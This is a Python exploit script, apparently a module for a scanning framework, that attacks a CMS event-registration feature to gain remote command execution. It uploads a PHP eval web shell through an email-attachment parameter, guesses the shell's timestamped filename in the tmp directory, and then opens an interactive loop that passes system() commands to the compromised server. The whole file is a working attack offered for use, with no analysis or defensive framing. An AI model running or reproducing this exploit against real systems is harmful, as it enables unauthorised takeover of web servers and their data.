import re
import urlparse

import requests

from lib.core.data import target


def poc():
    try:
        if not target.url.endswith("index.php"):
            print("[*] Please make sure the url end with 'index.php'")
            exit()

        # upload the shell
        url1 = target.url + "?module=eventregistration&action=emailRegistrants&email_addresses=123456789@123.com&email_message=1&email_subject=1"
        password = raw_input("[*] Please enter the shell-password:")
        phpShell = "<?php eval($_POST['" + password + "']);?>"
        shellName = "test.php"
        payload = {'attach': (shellName, phpShell, 'multipart/form-data')}
        r = requests.post(url1, files=payload)

        # find the shell path
        url2 = target.url + "?module=eventregistration&action=eventsCalendar"
        r = requests.get(url2)
        p = re.compile("(?<=rel:\')(.*)(?=\')")
        timestamp = int(re.search(p, r.text).group(0))
        shellPath = target.url.replace("index.php", "tmp/")

        for i in range(timestamp, timestamp - 100, -1):
            tmp = str(i) + '_' + shellName
            if requests.get(shellPath + tmp).status_code == 200:
                shell = shellPath + tmp
                break

        print("[*] The shell url: " + shell)
        print("[*] The shell password: " + password)

        while 1:
            try:
                command = raw_input("[*] input the command:")
                payload = 'system("%s");' % command
                if command != "exit":
                    postData = {password: payload}
                    r = requests.post(shell, data=postData)
                    print(r.text.encode(r.encoding))
                else:
                    break
            except EOFError as e:
                print("[*] type 'exit' to quit")
                pass

    except KeyError as e:
        print(
            "\033[31m[!] This poc doesn't seem to work.Please try another one.\033[0m"
        )
